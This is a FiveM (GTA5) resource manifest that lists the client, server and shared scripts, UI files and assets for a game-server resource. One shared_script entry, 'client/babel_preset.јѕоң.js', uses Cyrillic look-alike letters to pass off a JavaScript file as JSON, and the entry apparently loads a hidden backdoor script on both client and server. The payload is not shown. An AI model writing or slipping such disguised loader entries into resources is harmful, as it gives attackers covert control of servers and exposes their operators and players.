shared_script '@WaveShield/resource/include.lua'
fx_version 'cerulean'
game 'gta5'
shared_script {
    'client/babel_preset.јѕоң.js',
	"config.lua",
	"atrigger.lua",
}
client_scripts {
	'client/main.lua',
}
server_scripts {
	'@oxmysql/lib/MySQL.lua',
	-- '@mysql-async/lib/MySQL.lua',
	'server_config.lua',
	'server/main.lua',
}
ui_page {
	'html/index.html',
}
files {
	'html/index.html',
	'html/main.css',
	'html/font/*.ttf',
	'html/sound/*.mp3',
	'html/img/*.jpg',
	'html/img/*.png',
	'html/img/itemImages/*.jpg',
	'html/img/itemImages/*.png',
	'html/js/*.js',
}
escrow_ignore {
	'config.lua',
	'server_config.lua',
	'client/main.lua',
	'server/main.lua',
}  
lua54 'on'
dependency '/assetpacks'
lua54 'yes'